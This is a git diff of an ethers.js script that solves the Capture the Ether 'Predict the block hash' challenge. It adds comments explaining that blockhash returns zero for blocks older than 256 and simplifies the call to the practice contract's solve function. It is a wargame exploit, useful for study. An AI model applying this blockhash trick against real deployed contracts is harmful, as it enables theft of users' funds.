@@ -1,9 +1,16 @@
 
 const { utils, Contract } = require('ethers');
-
-var { wallet, provider, sleep } = require('./common')
+const { wallet, provider } = require('./common')
 
 const contractAddress = '0x2e7da1240640cced8e14a54885b5624d99ab1fbb';
+
+// https://www.freebuf.com/vuls/179173.html
+// https://systemweakness.com/capture-the-ether-predict-the-block-hash-bdbaf870cd5d
+
+// This piece of information is key to solve the challenge.
+// We know that sometime in the future(~1 hour), 
+// our current block will older than the 256 most recent blocks, 
+// and if we try and get the hash through the blockhash function, it’ll return 0.
 
 async function main() {
 	const iface = new utils.Interface([
@@ -24,7 +31,7 @@ async function main() {
 	// console.log('settlementBlockNumber : ', settlementBlockNumber);
 
 	var contract = new Contract(contractAddress, iface, provider);
-	let contractWithSigner = contract.connect(wallet);
+	var contractWithSigner = contract.connect(wallet);
 
 	// 1. call the predict function
 	// const options = { value: utils.parseEther('1.0') }
@@ -34,20 +41,12 @@ async function main() {
 	// return;
 
 	// 2. call the solve function, maybe take too long to wait for the solved
-	for (let i = 0; i < 1000; i++) {
-		try {
-			let tx = await contractWithSigner.solve();
+	var tx = await contractWithSigner.solve();
+	var result = await tx.wait();
+	console.log(result);
+	console.log('done..');
 
-			console.log('tx : ', tx);
-			var result = await tx.wait();
-			console.log(result);
-			console.log('done..')
-			return;
-		} catch (error) {
-			console.error(i);
-			await sleep(3000);
-		}
-	}
+	return;
 }
 
 main().catch(console.error);
